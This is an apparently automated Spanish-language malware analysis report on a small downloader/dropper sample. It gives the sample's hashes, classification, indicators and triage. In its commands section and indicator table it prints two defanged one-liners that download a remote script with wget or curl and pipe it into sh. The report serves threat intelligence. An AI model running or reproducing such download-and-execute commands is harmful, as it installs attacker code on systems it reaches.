# 🧬 Payload Analysis

`2ed093cc1bfe4cf92ed1f9d170d60dad98c1c57ae57f95e4c2bb830c9f522ca9`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 789 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://14.46.136.XXX/sh`. Se observaron o extrajeron 2 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:48:49.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2ed093cc1bfe4cf92ed1f9d170d60dad98c1c57ae57f95e4c2bb830c9f522ca9`
- **SHA1:** `44019fc1b29a1505d6c37b57b25130a05d25b520`
- **MD5:** `89df02c1ca1b4e9eb7a620ec9e41f95d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 789 B |
| Entropía | 5.2 |
| Strings | 17 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 190.179.144.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
| hash | 2ed093cc1bfe4cf92ed1f9d170d60dad98c1c57ae57f95e4c2bb830c9f522ca9 | static_analysis |
| ip | 185.211.94.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
